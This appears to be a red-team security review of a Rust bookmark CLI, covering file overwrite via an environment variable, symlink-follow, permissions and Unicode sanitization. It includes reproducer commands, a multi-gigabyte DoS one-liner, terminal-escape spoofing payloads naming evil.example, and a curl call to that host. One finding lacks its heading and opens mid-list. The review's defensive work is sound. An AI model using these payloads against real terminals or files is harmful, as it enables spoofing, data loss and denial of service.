### Accepted risk

**Finding 1 — `$BOOKMARK_CLI_DB` ambient authority over write target (Dim 5 — business-logic abuse; Rust supplement § Red Team — path traversal)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

[`src/main.rs:32-36`](../../src/main.rs) (`store_path`) takes `$BOOKMARK_CLI_DB` verbatim into a `PathBuf` with no canonicalization, no allowlist, and no warning. [`src/lib.rs:67-69`](../../src/lib.rs) (`BookmarkStore::save`) then calls `std::fs::write(path, json + "\n")`, which truncates the target file if it exists and creates it (with default mode) if not. An adversary who can set the env var in the user's shell (compromised `.bashrc`, malicious `.envrc` picked up by direnv, inherited env from a container or a wrapped `sudo -E`) can therefore have `bm add <innocuous-url>` truncate any file the user has write permission to. The destructive payload is the serialized JSON document, not the URL string — but the destruction itself is the attack: a user-run `bm add` overwrites `~/.ssh/known_hosts`, a project's `.env`, a working-tree file, or any other operator-writable path.

**Reproducer (paths abstracted per primer 3 § Confidentiality-aware citation):**
```sh
echo "important content" > <target>
BOOKMARK_CLI_DB=<target> bm add https://innocuous.example
# <target> now contains the serialized BookmarkStore JSON; original content lost.
```
The "URL" the attacker captures is irrelevant; the file overwrite is the primitive.

**Why this is real, not theatrical:** the env var is documented in DESIGN.md § Scope and non-goals as the project's entire config surface ("Configuration file — environment variable + sensible default is the entire config surface"). DESIGN.md does not name the trust boundary on that env var. The Rust supplement § Red Team — path traversal entry explicitly calls out that `Path::join` and bare-path I/O do not sanitize; the same concern applies one level up — accepting an env var directly into a destructive I/O sink without canonicalize-and-verify is the same defect class.

**Why Accepted risk rather than Raised to SO:** the trust-delegation IS the design choice for a single-user local CLI — refusing to write outside an allowlist would break the documented "use any path you want" affordance. The accepted boundary is "the env var is the operator's trust surface; if it's compromised, the attacker already has worse primitives (arbitrary command execution via the shell that set the var)." The Red Team's job is to make that boundary explicit, not to dispute it. Risk owner: solution-owner. The finding is recorded so the trust delegation is auditable; future layers (Layer 2 + 3, or any multi-user repositioning) should re-evaluate.

**Classification:** Accepted risk. Risk owner: solution-owner. The env var is the operator's declared trust surface; the attack assumes a prior compromise (env-var injection) that already grants worse primitives. Cross-reference: this finding overlaps with the symlink-follow primitive in Finding 6 — combining a polluted env var with a pre-staged symlink at the resolved path compounds the attack (the env var picks the symlink; the symlink redirects the write). The combination does not change the trust model but does illustrate Dim 9 (chained vulnerabilities) — recorded for future Security/Red Team rounds to address jointly.

**Finding 2 — Unbounded URL length is a memory + disk DoS primitive (Dim 11 — automated attack resilience; JSON supplement § Security — string length limit + document size limit)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

DESIGN.md § Edge case catalog states: "Very long URL (10K+ chars): accepted. No length cap." The implementation matches — [`src/main.rs:43-47`](../../src/main.rs) checks only `url.is_empty()`, then [`src/lib.rs:76-81`](../../src/lib.rs) (`BookmarkStore::add`) pushes the `String` unconditionally, [`src/lib.rs:67-70`](../../src/lib.rs) (`save`) calls `serde_json::to_string_pretty` (which allocates a copy) then `std::fs::write` (which writes the full payload to disk).

An adversary who can run `bm add "$(yes A | tr -d '\n' | head -c $((10*1024*1024*1024)))"` (10 GiB string) drives the process to (a) `clap` accepts the arg (no length cap on clap's String parsing); (b) `BookmarkStore::add` clones into the Vec; (c) `save` allocates the serialized JSON (~10 GiB + escape overhead); (d) `fs::write` writes that to the storage path, filling whatever filesystem holds the path. End states: OOM-kill mid-allocate, or successful 10+ GiB write filling the user's disk. Re-running `bm list` on the resulting store then re-allocates 10+ GiB on read. The 10 GiB figure is illustrative; the attack scales to whatever the user's shell will pass through ARG_MAX (typically ~128 KiB to a few MiB on Linux/macOS, but `xargs -0` or stdin-pipe shaped wrappers easily defeat that). Even a 100 MiB URL is a meaningful DoS for a tool advertising "captures URLs at the terminal."

The JSON supplement § Security calls out "Untrusted JSON parsing — string length limit" + "overall document size limit" as the standard defenses. None is applied here — no cap pre-write, no cap pre-read, no per-load streaming bound.

**Why Accepted risk:** the explicit non-goal in DESIGN.md ("No length cap") is the trust delegation — the user-is-responsible doctrine extends to "don't paste a 10 GiB URL." The Red Team's job is to surface that the spec-acknowledged accepted edge case IS adversarially weaponizable, not to dispute the design choice. A multi-user or untrusted-input repositioning would warrant a length cap; at single-user Layer 1, the operator accepts the risk.

**Classification:** Accepted risk. Risk owner: solution-owner. Cross-reference: DESIGN.md § Edge case catalog "Very long URL" + § Non-goals "URL validation beyond non-empty — accept any string."

**Finding 3 — Concurrent-write race adversarially weaponizable for write loss (Dim 5 — business logic abuse — race conditions)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

DESIGN.md § Edge case catalog: "Concurrent writes: out of scope; not a multi-process tool. Single user, single shell session." The implementation has no file locking, no atomic-rename pattern, no `flock(2)` — [`src/lib.rs:60-72`](../../src/lib.rs) (`save`) does a plain read-modify-write: `BookmarkStore::load` (read), `add` (mutate in memory), `BookmarkStore::save` (write-truncate). Two concurrent `bm add` invocations race: A reads state S, B reads state S, A writes (S + bookmark_A), B writes (S + bookmark_B). Result: A's bookmark is silently lost; the user has no signal that anything went wrong.

Adversarial weaponization: an attacker with the ability to run a shell command (e.g., via a wrapped `git pre-commit` hook the user installed, a malicious script the user pastes, a co-resident process) can deliberately race the user's `bm add` invocations to wipe legitimate bookmarks selectively. The attacker doesn't need to write malicious content — silent loss is the primitive. For a tool the user trusts to remember URLs, silent loss is a confidentiality-of-recall failure (the URL the user added is gone; they may believe it persisted).

**Why Accepted risk:** DESIGN.md explicitly excludes the multi-process scenario; the trust delegation is "single user, single shell session." Surfacing the adversarial framing makes the boundary explicit. Atomic-rename (`tempfile` + `rename`) is the conventional Rust pattern but would extend implementation surface; the spec's acceptance is the operator's call.

**Classification:** Accepted risk. Risk owner: solution-owner. Cross-reference: DESIGN.md § Edge case catalog "Concurrent writes: out of scope." The Red Team raises this as Accepted risk (not Dismissed) so the trust-delegation is auditable — a future Layer where multi-process semantics enter scope (e.g., Layer 3 `bm import` reading concurrently with `bm add` writing) must revisit this without inheriting the silent-loss acceptance.

**Finding 4 — Terminal-escape injection via stored URL rendered by `bm list` (Dim 7 — client-side attack chains — stored output injection)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

[`src/main.rs:74-76`](../../src/main.rs) renders each stored bookmark with `println!("{} {}", bm.timestamp.to_rfc3339(), bm.url)` — the URL field is written verbatim to stdout with no escape-sequence stripping, no quoting, no filtering. The URL field is a JSON-deserialized `String` ([`src/lib.rs:28-31`](../../src/lib.rs)); JSON natively supports `` escapes that deserialize to the raw byte `0x1b` (ESC). A bookmark stored with URL `"]0;PWNEDhttps://example.com"` will, on `bm list`, emit `ESC ] 0 ; P W N E D BEL` to the terminal — an OSC 0 sequence that sets the terminal's window title. The same channel admits OSC 8 (hyperlink masquerade: render a clickable link whose visible text is one URL but whose target is another), `\x1b[2J\x1b[H` (clear screen + cursor home), iTerm2 OSC 1337 (file/clipboard manipulation), OSC 133 (shell-integration prompt confusion), and DCS sequences depending on terminal emulator.

**Attack chains this enables (Dim 9):**
1. **Stored output spoofing.** Adversary adds a URL `"https://evil.example\x1b[F\x1b[Khttps://bank.example"` — on `bm list`, the cursor-up + erase-line sequence rewrites the immediately-prior line to show `https://bank.example`. The user copies what they see; the actual stored URL is the attacker's.
2. **Title-bar reconnaissance / phishing setup.** Adversary sets the terminal title to mimic a legitimate process (e.g., `sudo password prompt`), increasing the chance the next keystroke goes to attacker-controlled buffer in a multiplexed terminal session.
3. **OSC 8 hyperlink phishing.** OSC 8 lets the visible link text differ from the URI; rendered by modern terminals (iTerm2, kitty, WezTerm, gnome-terminal recent). A `bm list` line can display `https://benign.example` but launch `https://evil.example` on click.

**How a URL containing escape bytes lands in the store:** three plausible paths — (a) the operator pastes from a phishing source (`bm add "$(curl evil.example/url)"`); (b) another process writes the JSON file directly (the file is world-readable per Finding 5 and at least owner-writable; a co-resident attacker process or a malicious shell wrapper can append/modify); (c) the JSON spec admits these escapes natively, so a script that calls `bm add` programmatically may pass them in.

DESIGN.md § Edge case catalog acknowledges "URL containing newlines: accepted. May visually break the `bm list` output, which is acceptable for this scope." — the acknowledgement is **visual breakage**, not **terminal-escape injection as a security primitive**. The spec is silent on the security implication. The Red Team supplement § cli (not loaded inline here but applicable per [`../../../../vsdd-suite/supplements/cli.md`](../../../../vsdd-suite/supplements/cli.md)) and standard terminal-output hardening guidance (strip C0/C1 control sequences before display; restrict to printable ASCII + UTF-8 from a safe subset) is the standard mitigation.

**Why Raised to SO rather than Resolved or Accepted risk:** the spec is silent on the threat. Either (a) DESIGN.md should explicitly accept the risk with rationale (the user-is-responsible doctrine extended to "and you accept that displaying stored URLs can hijack your terminal"), OR (b) DESIGN.md should add a behavioral contract: `bm list` strips C0/C1 control characters from URL field before rendering, and the implementation follows. Either direction is the Solution Owner's call. Recording as Raised to SO so the spec's silence is closed — the current state (spec doesn't mention it, code doesn't defend) is the worst-of-both-worlds shape.

**Proposed change (for SO review):** Add to DESIGN.md § Behavioral contracts ` PROT_41 ` an explicit clause on stdout safety, e.g., "URLs are emitted as written; the caller is responsible for the safety of stored content (the tool does not strip control characters). Operators displaying bookmarks added from untrusted sources should pipe `bm list` through a sanitizer such as `cat -v` or `tr -d '\\000-\\010\\013-\\037\\177'`." OR alternatively, add: "Before emission, the URL field has C0 and C1 control characters (0x00–0x1F, 0x7F–0x9F excluding `0x09 0x0A 0x0D`) replaced with their `\\xNN` text form." Either route closes the spec-silence; my Red Team recommendation, given the cost asymmetry (one-line `str::chars().filter(...)` in the renderer vs. a real attack primitive), is the latter.

**Classification:** Raised to SO. Proposed DESIGN.md amendment above. Coordination: routes to [SOLUTION-OWNER-REVIEW.md](../SOLUTION-OWNER-REVIEW.md) for spec resolution; the implementation side, once SO directs, routes to [SOFTWARE-ENGINEER-REVIEW.md](../SOFTWARE-ENGINEER-REVIEW.md). Security should have caught this — flag also to [SECURITY-REVIEW.md](../SECURITY-REVIEW.md) per the Red-Team-to-Security flag-back convention in the domain prompt.

**Finding 5 — Storage file written with default 0644 (world-readable) leaks URL contents on shared systems (Dim 8 — information leakage; Dim 10 — insider threat)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

[`src/lib.rs:69`](../../src/lib.rs) calls `std::fs::write(path, json + "\n")`. On Unix, `std::fs::write` creates the file (when absent) with mode `0o666 & !umask` — for the default umask of `022`, that yields mode `0o644` (owner rw, group r, other r). The bookmark store thus becomes readable by every local user. URLs commonly carry sensitive data inline: bearer tokens (`https://example.com/?access_token=...`), OAuth state, basic-auth credentials (`https://user:pass@host`), pre-signed S3 URLs, AWS Console URLs with session tokens, magic-link auth URLs. The file path defaults to `./bookmarks.json` in the CWD, which the user may invoke from any directory (a shared `/srv/`, a project root with a permissive umask, a tmpfs); the README's example `~/.bookmarks.json` is owner-only in a single-user home but a multi-user home (Linux `/home/<user>` with group `users` and `0755` perms) still exposes the file to group/other readers.

**Attack chains this enables:**
1. **Token harvesting on a shared workstation.** User A captures bookmarks containing OAuth callback URLs with `code=` or `access_token=` params. User B on the same host reads `~A/bookmarks.json` (or `/srv/projects/<dir>/bookmarks.json`) and harvests the tokens.
2. **Reconnaissance on multi-tenant hosts.** Even URLs without inline credentials reveal what the user is doing — internal hostnames, project names, auth endpoints. The file is a low-noise enumeration target.

DESIGN.md positions the project as "single-user local tool" but the default CWD-relative path means the file lands wherever the user runs the command from. On a personal laptop, no exposure; on a shared host, hosted dev environment, or any path with permissive perms, real exposure.

**Why Raised to SO rather than fixed:** the spec is silent on file permissions. Either DESIGN.md should add a behavioral contract ("storage file is created with mode 0o600 / owner rw only") and the implementation switches to `OpenOptions::new().mode(0o600).write(true).create(true).truncate(true).open(path)`, OR DESIGN.md should explicitly accept the risk ("storage file inherits default umask; operators on shared hosts must adjust umask before running `bm`"). The current state — spec silent, code writes 0644 — is the worst-of-both-worlds.

**Proposed change (for SO review):** Add to DESIGN.md § Storage format: "The storage file is created with mode `0o600` (owner read-write only) on Unix-like platforms. URLs may contain credentials; the file is treated as user-private." Implementation: replace `std::fs::write` with `OpenOptions::new().mode(0o600).write(true).create(true).truncate(true).open(path)` + `.write_all(...)`. macOS + Linux both support this via `std::os::unix::fs::OpenOptionsExt::mode`; Windows is "untested" per DESIGN.md § Constraints so the `#[cfg(unix)]` gate is acceptable.

**Classification:** Raised to SO. Proposed DESIGN.md amendment above. Coordination: routes to [SOLUTION-OWNER-REVIEW.md](../SOLUTION-OWNER-REVIEW.md); the implementation side routes to [SOFTWARE-ENGINEER-REVIEW.md](../SOFTWARE-ENGINEER-REVIEW.md). Also flag to [SECURITY-REVIEW.md](../SECURITY-REVIEW.md) — Security should have caught this in their first round per the absent-control criterion in the Red Team domain's flag-back convention.

**Finding 6 — Symlink-follow on save enables write-target redirection (Dim 6 — server-side attack chains — file confusion; Rust supplement § Red Team — path traversal)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

[`src/lib.rs:67-70`](../../src/lib.rs) (`save`) calls `std::fs::write(path, ...)` which follows symlinks. [`src/lib.rs:49-50`](../../src/lib.rs) (`load`) calls `std::fs::read_to_string(path)` which also follows symlinks. Neither path uses `O_NOFOLLOW`, `fs::symlink_metadata`, or any `is_symlink` check.

**Attack scenario:** an adversary with write access to the parent directory of the storage path (e.g., `/tmp/`, a shared `/srv/projects/`, or a directory the user just `cd`'d into from an untrusted clone) pre-stages a symlink at the storage path before the user runs `bm`. The symlink target is a file the user has write access to but the attacker does not (e.g., `~/.config/important.json`, a project's `.env`, a CI secret file the user can read+write). When the user runs `bm add <any-url>`:

1. `load()` reads the file via `read_to_string` — follows symlink — reads target content.
2. If target is empty or matches `BookmarkStore` schema (rare; usually triggers parse error and exit 2), proceed; otherwise the user gets `Error: parsing bookmark store...` and exits — but the attacker has now learned something about the target (parse-error vs. empty vs. valid → oracle for content shape).
3. `save()` writes via `fs::write` — follows symlink — overwrites target with serialized JSON.

End state: a file the user has write access to is overwritten with the bookmark JSON, even though the user thinks they're writing only to `bookmarks.json`. The attacker doesn't need write permission on the target — they only need to control the symlink staging.

**Compounding with Finding 1:** an attacker who can both (a) inject `$BOOKMARK_CLI_DB=/<some-path>` AND (b) pre-stage a symlink at `/<some-path>` gets a two-step write primitive — the env var picks the symlink; the symlink redirects to the actual target. This is the Dim 9 chained-vulnerability shape; surfaced here.

**Why Raised to SO rather than implementation-only fix:** the spec is silent on FS hardening. The fix requires a spec-level commitment ("the tool refuses to write through symlinks at the storage path") so the behavioral contract is testable — the implementation change is then `OpenOptions::new().custom_flags(libc::O_NOFOLLOW).write(true).create(true).truncate(true).open(path)` for save, and analogous handling for load. The spec change is the gating step; implementation follows naturally.

**Proposed change (for SO review):** Add to DESIGN.md § Storage format: "The storage path must not be a symlink. If the resolved path is a symlink, the tool errors with `Error: storage path is a symlink; refusing to follow.` and exits 2 — no file is written or read through the symlink." Implementation: pre-flight `fs::symlink_metadata(path)` and reject if `file_type().is_symlink()` for both load and save paths; OR use `O_NOFOLLOW` open via `OpenOptionsExt::custom_flags`. The pre-flight check has a TOCTOU window of its own; `O_NOFOLLOW` is the stronger pattern and the Rust supplement § Red Team — path traversal entry implicitly endorses it ("Use `canonicalize` and verify the result is within the intended root, or reject non-component path segments explicitly" — same family of defenses).

**Classification:** Raised to SO. Proposed DESIGN.md amendment above. Coordination: routes to [SOLUTION-OWNER-REVIEW.md](../SOLUTION-OWNER-REVIEW.md); the implementation side routes to [SOFTWARE-ENGINEER-REVIEW.md](../SOFTWARE-ENGINEER-REVIEW.md). Also flag to [SECURITY-REVIEW.md](../SECURITY-REVIEW.md) — absent-control finding per the Red-Team-to-Security flag-back convention.

**Finding 2 — Round 1 F5 world-readable storage file — verify mode 0o600 holds and the temp-file pre-rename window is also 0o600 (Dim 8)**

<a id="r2-f2"></a>

**Owner:** red-team
**Status:** validated
**Blocked by:** *(none)*
**Validator:** security

Round 1 F5 raised the default-umask `0o644` exposure of confidential-class data (browsing-history URLs that commonly contain bearer tokens, OAuth state, basic-auth creds). Round 2 fix landed: [`src/lib.rs:234-247`](../../src/lib.rs) defines a `#[cfg(unix)]` `write_temp_file` that opens with `OpenOptions::new().write(true).create_new(true).mode(0o600).open(tmp_path)?`. The temp file is owner-only from creation; the subsequent `rename(tmp_path, path)` preserves the inode's permissions, so the on-disk file ends up at mode `0o600`. DESIGN.md § Storage data classification declares the confidential tier explicitly ([`DESIGN.md:194-198`](../../DESIGN.md)).

**Adversarial bypass attempts:**

1. **Pre-rename window — is the temp file ever world-readable?** The `create_new(true).mode(0o600)` call passes `O_CREAT | O_EXCL` with mode `0o600` to `open(2)`. The kernel applies `actual = mode & ~umask` at file-creation time — so with umask `0o022`, actual = `0o600 & ~0o022 = 0o600`. With umask `0o000`, actual = `0o600`. With umask `0o077`, actual = `0o600 & ~0o077 = 0o600`. The temp file is owner-only at creation; no window during which it is world-readable. **Bypass fails.**
2. **Umask edge case — what if operator's umask is `0o600`?** actual = `0o600 & ~0o600 = 0o000`. The file would have no permissions and even the owner couldn't read it back. This is a pathological operator-controlled umask; not exploitable by an attacker (the attacker can't set the user's umask without already controlling the shell). The integration test at [`tests/bookmarks.rs:294-311`](../../tests/bookmarks.rs) (`save_creates_file_with_mode_0600_on_unix`) runs under the test process's umask (typically `0o022`) and asserts mode `0o600`; the test would fail under a `0o600`-umask environment but that environment is outside the threat model.
3. **TOCTOU between temp creation and rename — can attacker substitute the temp file?** The temp file is opened with `O_EXCL` ([`create_new(true)`](../../src/lib.rs)) which atomically creates-or-fails. The attacker cannot replace it without an unlink first. Unlinking the temp file would cause `f.write_all` or `f.sync_all` to fail (write to deleted inode succeeds against the still-open fd; sync_all may surface the issue depending on filesystem). Even if the attacker unlinks + recreates at the temp path, the `rename(tmp_path, path)` is by path, so the rename would move the attacker's file. **But** — the attacker would need write access to the parent directory the user controls, at which point they already have F1's accepted-risk env-var primitive. No new attack capability is granted.
4. **The Round 1 finding included `~/.bookmarks.json` under default umask** — verified the integration test catches a regression that re-introduces `std::fs::write`. The mode assertion is exact (`assert_eq!(mode, 0o600, "expected mode 0600, got {mode:o}")`) and would fail loudly on regression.

The unit test at [`src/lib.rs:483-494`](../../src/lib.rs) (`save_creates_file_with_mode_0600`) provides a second-source verification via the library API directly.

**Resolution:** Round 1 F5 fix verified. Mode `0o600` is set at temp-file creation; no world-readable window exists pre-rename; DESIGN.md § Storage data classification declares the confidential tier so the spec contract is testable. The validator pair confirms the Dim 8 floor holds (Dim 8)

**Finding 3 — Round 1 F6 symlink-follow on save — verify `symlink_metadata` rejection holds against the save path (Dim 6)**

<a id="r2-f3"></a>

**Owner:** red-team
**Status:** validated
**Blocked by:** *(none)*
**Validator:** security

Round 1 F6 raised symlink-follow attack on both load and save paths. Round 2 fix on save: [`src/lib.rs:131-139`](../../src/lib.rs) calls `std::fs::symlink_metadata(path)` and refuses with an explicit `anyhow!("refusing to write through symlink at {}: ...")` if `file_type().is_symlink()` returns true. DESIGN.md § Threat model declares the discipline ([`DESIGN.md:184`](../../DESIGN.md)): "symlink-follow-rejection on save (the implementation checks `symlink_metadata` + refuses to write through a symlink pointing outside the parent directory)".

**Adversarial bypass attempts:**

1. **TOCTOU race between `symlink_metadata(path)` and `rename(tmp_path, path)` — can attacker create a symlink at `path` after the check passes?** This was explicitly probed. POSIX `rename(2)` semantics: when the destination of `rename(src, dst)` exists, the destination is replaced atomically — and crucially **`rename(2)` does NOT follow symlinks at the destination**. If an attacker wins the TOCTOU race and creates a symlink at `path` between the check and the rename, the rename replaces the symlink itself with the temp file's contents; the symlink's actual target is untouched. The window exists but is not exploitable for write-redirection. **Bypass fails.**
2. **Path-of-creation race — what if `path` doesn't exist at check time?** The `if let Ok(meta) = std::fs::symlink_metadata(path)` arm at [`src/lib.rs:132`](../../src/lib.rs) silently passes through when `path` is absent (the `Err(NotFound)` branch is the no-op). An attacker who creates a symlink at `path` between this point and the rename runs into the same `rename(2)`-replaces-symlink semantics analyzed above. **Bypass fails.**
3. **Symlinked parent component** — `symlink_metadata(path)` only checks if the final-component basename is a symlink; intermediate path components may be symlinks and are followed. E.g., `path = /home/user/data/bookmarks.json` where `/home/user/data` is a symlink to an attacker-controlled directory. The save writes into the attacker's directory. **However** — this is consistent with the spec: DESIGN.md § Threat model names the discipline as "the storage path must not be a symlink" (the path itself, not its parent). The env-var ambient-authority finding (Round 1 F1, Accepted risk) already documents that the user is responsible for the resolved path including its parent chain. **Not a bypass of the named control; consistent with F1's accepted boundary.**
4. **Symlink-to-directory scenario** — `path` is a symlink pointing at a directory. `symlink_metadata` returns `file_type().is_symlink() == true` → rejected. **Bypass fails.**

The integration test at [`tests/bookmarks.rs:255-287`](../../tests/bookmarks.rs) (`save_refuses_symlink_target`) pre-stages a symlink at `BOOKMARK_CLI_DB`, runs `bm add`, asserts exit 2 + stderr contains "refusing to write through symlink" + the symlink's target file is byte-identical to its pre-test contents. The unit test at [`src/lib.rs:455-481`](../../src/lib.rs) (`save_refuses_symlink`) provides second-source verification via the library API.

**Resolution:** Round 1 F6 save-path fix verified. The named threat (write-target redirection via symlink at the storage path) is closed by the `symlink_metadata` pre-check + `rename(2)` semantics. **However** — the Round 1 finding's full text named BOTH `load()` and `save()` as needing the fix; the Round 2 implementation closed save only. The load-side symlink-follow surface is the subject of Finding 5 below (Open) — the validator pair convention surfaces the asymmetry as a new finding rather than degrading this Resolved classification (Dim 6)

**Owner:** security
**Status:** raised

[`src/lib.rs:86-97`](../../src/lib.rs) (`BookmarkStore::load`) calls `path.exists()` then `std::fs::read_to_string(path)`. Neither call rejects symlinks — `read_to_string` follows symlinks transparently. 2. User runs `bm list` or `bm add <url>`. `BookmarkStore::load` calls `path.exists()` → true (the symlink exists). `read_to_string` follows the symlink → reads the target file's content.

The error message via `display_safe` is escape-safe, but the parse-error existence reveals "the file is non-empty and contains data". For attacker probing `~/.ssh/known_hosts`, this confirms the file exists and is non-empty.

The oracle is weaker than a full read primitive (the attacker doesn't receive file contents directly), but it confirms file existence + non-emptiness + schema-shape via three observable channels (parse-error vs. empty vs. valid). For sensitive-file enumeration on shared hosts, this is a meaningful primitive.

The integration test at [`tests/bookmarks.rs:255-287`](../../tests/bookmarks.rs) tests save only; no test exercises the load path against a symlink.

**Proposed fix:** mirror the `symlink_metadata` check in `BookmarkStore::load` — if `path.exists()` succeeds AND `symlink_metadata(path).file_type().is_symlink()` returns true, refuse with the same error shape ("refusing to read through symlink at <path>"). Update DESIGN.md § Threat model to extend the discipline: "symlink-follow-rejection on both load AND save". Add an integration test pre-staging a symlink and running `bm list` → assert exit 2 + stderr contains "refusing to read through symlink".

**Classification:** Open — the surface is structurally real and the Round 1 finding explicitly named it; the Round 2 fix closed half of it. **Finding 6 — `display_safe` Cf coverage narrower than Rust supplement names; tag characters and U+061C bypass the named-subset matcher (Dim 7 — client-side attack chains)**

<a id="r2-f6"></a>

**Owner:** security
**Status:** raised
**Blocked by:** *(none)*
**Validator:** security

[`src/lib.rs:303-308`](../../src/lib.rs) defines `is_format_char` as:

```rust
const fn is_format_char(c: char) -> bool {
    matches!(
        c as u32,
        0x200B..=0x200F | 0x202A..=0x202E | 0x2066..=0x2069 | 0xFEFF
    )
}
```

The named ranges cover zero-width chars + standard bidi controls + BOM. The Rust supplement § Security states the sanitizer "must escape `is_control()` chars (`Cc`) AND `Cf` format chars (Trojan-Source U+202E and zero-width characters)". The supplement's phrasing names "Cf format chars" as a category; the named examples (U+202E, zero-width) are illustrative, not exhaustive. Several Unicode Cf chars outside the matched ranges flow through `display_safe` unescaped:

1. **U+061C ARABIC LETTER MARK (ALM):** added Unicode 6.3. A bidi format char that strongly influences bidi-context rendering in mixed Arabic/Latin contexts. Not in `is_format_char`'s matched ranges; `is_control()` returns false. **Bypasses sanitization.** A URL containing `https://example.com/\u{061c}path` renders raw to the terminal — most modern terminals (kitty, iTerm2, gnome-terminal recent) honor ALM and reflow the surrounding text accordingly. Visual-spoofing-via-bidi is reduced but not eliminated.
2. **Tag characters U+E0001 + U+E0020–U+E007F:** these are Unicode "tag" characters historically used for language tagging, repurposed by the [Trojan Source paper](https://trojansource.codes/) (2021) as an *invisible* code-injection channel — they encode ASCII text invisibly in supplementary-plane chars that some text-shaping engines pass through. Not in any matched range; `is_control()` returns false. **Bypasses sanitization.** A URL containing tag-character payload renders invisibly in many terminals.
3. **Mongolian Free Variation Selectors U+180B–U+180D:** Cf chars used in Mongolian text shaping. Not matched. **Bypasses sanitization.** Marginal practical impact for URL rendering but a Cf-category gap.
4. **Variation Selectors U+FE00–U+FE0F + U+E0100–U+E01EF:** Cf-family selectors. Not matched. **Bypasses sanitization.** Used for emoji + CJK variation; minor practical attack surface but a Cf-category gap.

The supplement's "Cf format chars" framing is broader than the implementation. The DESIGN.md § Threat model amendment names the matched set as authoritative ("escapes `is_control()` (Cc) chars + `Cf` format chars while preserving `\n` `\t` for legitimate whitespace") — but the spec text says "Cf format chars" without naming the narrowed subset. The spec is silent on whether the narrowing is intentional. **This is a real gap between spec wording and implementation, and the gap admits a real (if narrow) attack class.**

**Sycophancy check applied:** the easy dismissal is "the threat model named the set explicitly in the implementation; the spec text 'Cf format chars' is shorthand for the named set". But the spec text reads naturally as the full Cf category; a future Phase 5 / Phase 6 reviewer or a downstream consumer would not infer the narrowing from DESIGN.md § Threat model alone. The implementation is a strict subset of what the spec promises.

**Two resolution paths:**

(a) **Broaden the implementation** to match the spec wording — use `unicode-general-category` or hand-roll the full Cf range. Adds a dependency (or a larger `matches!` arm) and broadens the escape set, which is the Red Team-preferred direction (closes the named gap; the spec's "Cf format chars" framing is preserved).

(b) **Narrow the spec wording** to match the implementation — amend DESIGN.md § Threat model to enumerate the named subset explicitly: "escapes `is_control()` (Cc) chars + the Cf format chars at U+200B–U+200F, U+202A–U+202E, U+2066–U+2069, U+FEFF, while preserving `\n` `\t` for legitimate whitespace". The spec/code parity is restored; the U+061C + tag-character + variation-selector attack surface becomes documented Accepted risk (the threat model declares "we only defend the named-subset; broader Cf is operator-responsible content").

The Red Team recommendation is (a) for the same reason Round 1 raised the original finding: the cost asymmetry (one-time `unicode-general-category` dep cost vs. a recurring class of bypass) favors broadening the control. The Solution Owner has the call.

**Classification:** Open — Raised to SO for the spec-vs-implementation gap adjudication (which direction: broaden or narrow?). Routed to `solution-owner` for the spec direction + `software-engineer` for the implementation side. Red Team validates the post-fix Cf coverage either matches the narrowed spec or covers the full Cf category (Dim 7)
